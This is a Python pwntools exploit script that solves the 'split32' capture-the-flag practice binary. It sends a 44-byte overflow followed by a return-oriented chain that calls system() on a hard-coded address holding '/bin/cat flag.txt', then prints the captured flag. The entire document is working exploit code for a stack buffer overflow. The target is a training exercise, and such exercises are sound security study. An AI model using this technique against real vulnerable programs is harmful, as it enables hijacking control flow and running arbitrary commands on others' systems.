from pwn import *

BINARY = "./split32"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY

p = process(BINARY)

rop = b"A" * 44 
rop += p32(ELF.symbols["system"]) # get eip and run system()
rop += b"HOGE" # return address of system()
rop += p32(0x0804A030) #address of "/bin/cat flag.txt"

log.success(f"ROP chain : {rop}")

p.sendline(rop)
flag = p.recvline()
flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG: {flag}")

